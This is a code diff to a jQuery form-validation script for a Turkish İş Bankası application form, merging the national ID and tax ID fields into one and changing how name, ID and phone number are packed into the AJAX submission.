@@ -215,13 +215,8 @@
                 },
                 tcBank: {
                     required: !0,
-                    minlength: 11
-
-                   },
-                vergikimlikBank: {
-                    required: !0,
                     minlength: 10
-                   },           
+                   }        
                },
                messages: {
                 nameBank: {
@@ -233,20 +228,15 @@
                     minlength: "* Telefon numaranız 11 haneli olmalıdır."
                 },
                 tcBank: {
-                    required: "* T.C kimlik numaranızı yazınız",
-                    minlength: "* En az 11 karakter girilmelidir."
-                   },
-                vergikimlikBank: {
-                    required: "* Vergi kimlik numaranızı yazınız",
+                    required: "* T.C kimlik/Vergi numaranızı yazınız",
                     minlength: "* En az 10 karakter girilmelidir."
                    }
                },
          submitHandler: function(i) {
-             console.log("iş bankası kaydı");
            var r = e(i).serializeArray(),
            a = {
             fullName: '<br>-- İŞ BANKASI BAŞVURU FORMU --<br><br>'+r[0].value.toString(),
-            phone:'TC NO: '+r[2].value.toString()+'<br>'+'VERGI NO: '+r[3].value.toString() +'<br>TEL NO: '+r[1].value.toString()
+            phone:'TC NO/VERGI NO: '+r[2].value.toString()+'<br>'+'<br>TEL NO: '+r[1].value.toString()
            };
           console.log(a);
           e.ajax({
